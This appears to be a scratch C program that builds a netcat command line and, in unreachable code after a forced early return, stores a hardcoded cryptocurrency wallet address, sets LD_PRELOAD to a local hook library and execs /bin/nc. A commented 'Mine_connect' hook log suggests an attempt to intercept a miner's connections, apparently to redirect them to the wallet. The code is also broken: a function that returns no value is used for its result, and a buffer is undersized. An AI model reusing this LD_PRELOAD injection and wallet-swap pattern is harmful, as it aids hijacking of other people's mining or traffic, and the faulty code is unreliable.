
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
#include <unistd.h>  
#include <sys/socket.h>  
#include <netinet/in.h>  
#include <arpa/inet.h> 
#include <errno.h>


char *name="nc";
char s_mWallet[50];
int i_mWalletLen;

static char *build_cmd(int argc, char **argv){
    int i;
    int len=strlen(name);
    for(i=0;i<argc;i++){
        len+=1;
        if(i==0)continue;
        len+=strlen(argv[i]);
        printf("%s\n",argv[i]);
    }
    char *cmd=malloc(len);
    strcpy(cmd,name);
    len=strlen(name);
    memcpy(cmd+len," ",1);
    len+=1;
    for(i=0;i<argc;i++){
        if(i==0)continue;
        strcpy(cmd+len,argv[i]);
        len+=strlen(argv[i]);
        memcpy(cmd+len," ",1);
        len+=1;
    }
    printf("%s\n",cmd);
}
int main(int argc, char **argv) {
    struct sockaddr_in mysock;
    bzero(&mysock,sizeof(mysock));
    mysock.sin_family = AF_INET;  //设置地址家族
    mysock.sin_port = htons(8000);  //设置端口
    mysock.sin_addr.s_addr = inet_addr("127.0.0.1");//sa->sin_addr.s_addr;  //设置地址
    bzero(&(mysock.sin_zero), 8);
    
    //Syelog(SYELOG_SEVERITY_INFORMATION, "###: Mine_connect(%p,%d) -> %p\n",addr, addrlen,sa->sin_addr.s_addr);
    char *ip=inet_ntoa(mysock.sin_addr);
    if(ip)printf("%s\n",ip);

    if(1==1)return 0;
    char *cmd=build_cmd(argc,argv);
    //int execv(const char *path, char *const argv[]);
    strcpy(s_mWallet,"0x88aB6f58FFD714608734A69663bF5A3083e099DF");
    i_mWalletLen=strlen(s_mWallet);

    setenv("LD_PRELOAD","./hook.so",1);
    if(execv("/bin/nc",argv)<0)
    {
        fprintf(stderr,"execv failed:%s\n",strerror(errno));
        return -1;
    }
    return 0;
}

